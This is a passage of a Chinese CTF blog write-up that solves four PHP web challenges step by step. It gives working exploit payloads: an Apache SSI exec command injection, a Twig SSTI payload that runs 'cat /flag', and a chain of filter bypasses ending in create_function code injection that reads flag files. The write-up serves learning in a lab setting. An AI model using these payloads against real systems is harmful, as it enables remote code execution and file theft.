<h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>看到题目的search想到源码泄露，访问index.php.swp得到部分源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一层直接爆破：</p>
<p>自己写的垃圾脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9999999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5(<span class="variable">$i</span>),<span class="number">0</span>,<span class="number">6</span>) == <span class="string">&quot;6d0bc1&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$i</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span>%<span class="number">1000000</span> == <span class="number">0</span>) <span class="keyword">echo</span> <span class="string">&quot;***&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929211713316.png"></p>
<p>登陆成功:</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20200929211756697.png"></p>
<p>在响应标头里找到随机生成的url：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004165154451.png"></p>
<p>打开：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004165223729.png"></p>
<p>然后是一个新的知识点：<a target="_blank" rel="noopener" href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html">Apache 开启SSI配置使shtml支持 include()和SSI Shell漏洞问题</a></p>
<p>本题中没有过滤，直接在username里打就可以了：</p>
<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004171037689.png"></p>
<p><code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004171201673.png"></p>
<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>老图了：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/v2-5f58e1a2a31dbd533d82bd9dbcbb0bc2_r.jpg"></p>
<p>依次测试： <code>$&#123;7*7&#125;</code>，返回<code>$&#123;7*7&#125;</code>，不通过；测试<code>&#123;&#123;7*7&#125;&#125;</code>，返回49，通过；测试 <code>&#123;&#123;7*'7'&#125;&#125;</code>，返回49,判断模板为twig(如果是jinja2返回<code>7777777</code>，并且twig是php，jinja是python)</p>
<p>知识点链接：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">一篇文章带你理解漏洞之SSTI漏洞/#2-Twig</a></p>
<p>hint:</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004222013695.png"></p>
<p>根据文章得到payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004221654162.png"></p>
<h2 id="EzPHP"><a href="#EzPHP" class="headerlink" title="EzPHP"></a>EzPHP</h2><blockquote>
<p>ez不一定ez，但是hard是真的hard</p>
</blockquote>
<p>hint：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004223440325.png"></p>
<p>base32解码：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201004223456332.png"></p>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>先看一下第一层过滤：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fjb2080/article/details/80548431">有关$_SERVER的知识</a></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201009192644228.png" alt="image-20201009192644228"></p>
<p>所以本题中$_SERVER[‘QUERY_STRING’]过滤的是get的参数，直接用url编码绕过即可，有一个小坑就是：一般网上的在线url编码/解码不会对字母数字进行编码，因为：</p>
<blockquote>
<p>“…Only alphanumerics [0-9a-zA-Z], the special characters “$-<em>.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.”</em></p>
<p>“只有字母和数字[0-9a-zA-Z]、一些特殊符号”$-_.+!*’(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。”</p>
</blockquote>
<p>一般来说这些字符的url编码就是ascii码前面加个<code>%</code>,具体参考：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_urlencode.htm">https://www.w3school.com.cn/tags/html_ref_urlencode.htm</a></p>
</li>
<li><p>第二层过滤又要在debu中正则匹配到”aqua_is_cute”并且用^和$卡住了两端，又要求debu !== “aqua_is_cute” ，看似不可能，但是结尾没有<code>/D</code>的话，<code>$</code>会省略句尾的<code>%0a</code>。所以只需要传入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu&#x3D;aqua_is_cute%0a</span><br></pre></td></tr></table></figure>
<p>再url编码一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a</span><br></pre></td></tr></table></figure></li>
<li><p>第三层过滤是看看$_REQUEST中有没有英文字母，即使是url编码，因为是16进制，所以依然会有英文字母的出现，这里涉及到$_REQUEST的一个特性(bug)：当GET和POST都存在同一个变量名的时候，只获取POST中的值，所以可以通过这个特性来绕过正则的匹配。如图：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201009195949155.png"></p>
</li>
<li><p>第四层：<code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)</code>就是要在$file中写入“debu_debu_aqua”，可以用php://input或者data://text/plain,(url编写内容)绕过，参考：<a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_8a65767d0102v94a.html">PHP file_get_contents 绕过</a></p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201009204957520.png"></p>
</li>
<li><p>第五层：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cyyAray/article/details/78340241">PHP 中的sha1()和MD5()函数漏洞</a></p>
<p>当传入?shana[]&amp;passwd[]=123时，他俩的sha1都为null，但是两者不相等。</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201009205507311.png"></p>
</li>
<li><p>第六层，也是最后一层了。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58713380">代码审计从入门到放弃(一) &amp; function</a></p>
<p>从参考文章可知，<code>&amp;5c</code>即<code>\</code>打头时可以正常运行var_dump()，但是。。。本题中变量code和arg没办法get。。。</p>
<p>然后我发现在sha1过滤的地方会执行一个extract函数（刚开始还没看见，找了好久。。。）这是一个经典的变量覆盖的问题。</p>
<p>不过也有个小坑，就是刚开始不知道如何变量覆盖，网上的资料基本都是<code>extract($_GET); </code>，直接传入<code>code=xxx&amp;arg=xxx</code>即可；这里的<code>extract($_GET[&quot;flag&quot;]); </code>需要传入<code>flag[code]=xxx&amp;flag[arg]=xxx</code></p>
<p>输入<code>flag[code]=%5cvar_dump&amp;flag[arg]=23333</code>（url编码之后为：<code>%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70&amp;%66%6c%61%67%5b%61%72%67%5d=2333</code>）进行测试:</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010111707519.png"></p>
<p><code>灏卞湪杩欓噷锛屼綘鑳芥嬁鍒板畠鍚楋紵</code></p>
<p>F12：<img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010114813584.png"></p>
<p>到这里思路就断了，以为这些生僻字是flag，但是看了wp之后才发现不是。在<code>$code(&#39;&#39;, $arg);</code>处没有执行任何指令，我还以为被ban的函数这么多，不需要绕过，以及include了flag.php，以及出现了flag字样，导致我以为flag出了，后面是个misc。</p>
<p>顺着wp的思路往下：因为include了flag.php，所以可以用<code>get_defined_vars()</code>将所有变量dump出来</p>
<p>本来想试试能不能不利用create_function直接dump，后面发现不行：<img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010155027164.png"></p>
<p>因为此时执行的是<code>var_dump(&#39;&#39;,&#39;get_defined_vars()&#39;)</code>，所以还是得利用create_function，原理解析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/94/">[科普向] 解析create_function() &amp;&amp; 复现wp</a></p>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f</span><br></pre></td></tr></table></figure>
<p>（刚开始以为过滤了<code>&#125;</code>,但是仔细看看发现只过滤了<code>&#123;</code>。。。以及，为什么code不需要<code>%5c</code>）</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010160637448.png"></p>
<p>将所有变量dump出来之后发现提示真正的flag在rea1fl4g.php</p>
<p>因为过滤了include，所以可以用require代替include，将rea1fl4g.php包含进来，并且过滤了<code>·</code>，可以用base64绕过</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">cmVhMWZsNGcucGhw:rea1fl4g.php的base64编码</span><br><span class="line">url编码之后为：</span><br><span class="line">%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f</span><br></pre></td></tr></table></figure>
<p>然后得到了一个假的flag：（脸上笑嘻嘻</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010161925745.png"></p>
<p>根据wp，预期解是取反绕过：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>最后终于拿到flag：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201010164915050.png"></p>
</li>
</ol>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>首先找到hint：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201011110916069.png"></p>
<p>顺着hint随便找了篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/phpfenghuo/article/details/12853031">php获取客户端IP地址的几种方法</a></p>
<p>测试了一下发现是XFF：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201011112628470.png"></p>
<p>因为先做了Cookie is so stable这一题，两个页面差不多，连hint的位置都一样，所以先考虑SSTI。</p>
<p>输入config，根据报错发现模板是smarty：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201229175242935.png" alt="image-20201229175242935"></p>
<p>漏洞确认&amp;查看版本:</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201229175533298.png" alt="image-20201229175533298"></p>
<p>然后google：smarty ssti 找了个payload打通了：</p>
<p><img src="https://raw.githubusercontent.com/zk1te/img/main/image-20201229181102775.png" alt="image-20201229181102775"></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/04/27/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI/">https://mayi077.gitee.io/2020/04/27/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI/</a></p>
<p>感觉这两题逻辑是一样的，都是smarty的ssti，注入点都是xff</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/2021/01/24/%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF%E6%80%9D%E8%B7%AF/" rel="next" title="DJBCTF">
      DJBCTF <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-MD5"><span class="nav-number">1.</span> <span class="nav-text">Easy MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mark-loves-cat"><span class="nav-number">2.</span> <span class="nav-text">Mark loves cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="nav-number">3.</span> <span class="nav-text">ZJCTF，不过如此</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasySearch"><span class="nav-number">4.</span> <span class="nav-text">EasySearch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie-is-so-stable"><span class="nav-number">5.</span> <span class="nav-text">Cookie is so stable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EzPHP"><span class="nav-number">6.</span> <span class="nav-text">EzPHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-mystery-of-ip"><span class="nav-number">7.</span> <span class="nav-text">The mystery of ip</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="K1te"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">K1te</p>
  <div class="site-description" itemprop="description">看到我请叫我滚去学web</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://chikorita.fun/" title="https:&#x2F;&#x2F;chikorita.fun&#x2F;" rel="noopener" target="_blank">茗哥</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://oatmeal.vip/" title="https:&#x2F;&#x2F;oatmeal.vip&#x2F;" rel="noopener" target="_blank">Oatmeal</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://examine2.top/" title="https:&#x2F;&#x2F;examine2.top&#x2F;" rel="noopener" target="_blank">examine</a>
        </li>
        <li class="links-of-blogroll-item">
